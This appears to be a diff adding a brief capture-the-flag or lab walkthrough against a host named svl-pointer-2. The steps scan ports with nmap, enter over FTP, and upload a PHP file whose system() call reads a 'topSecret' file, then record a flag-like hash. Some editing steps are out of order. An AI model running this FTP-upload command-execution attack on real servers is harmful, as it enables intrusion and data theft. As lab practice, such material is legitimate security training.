@@ -1,0 +1,29 @@
+#find open ports
+nmap svl-pointer-2
+
+#get in through ftp
+ftp svl-pointer-2
+
+#show directories
+ls -a
+
+#change into directory with classified information
+cd blueprints
+
+#list all blueprints
+ls -a
+
+#
+nano 
+newfile.php
+cd 
+<?php
+system("cat blueprints/topSecret.txt");
+?>
+
+#put file in server
+ftp svl-pointer-2
+put newfile.php 
+
+#nagivate to new url
+#90ff4d2b74f9aad5d2f6a7e6f3378673
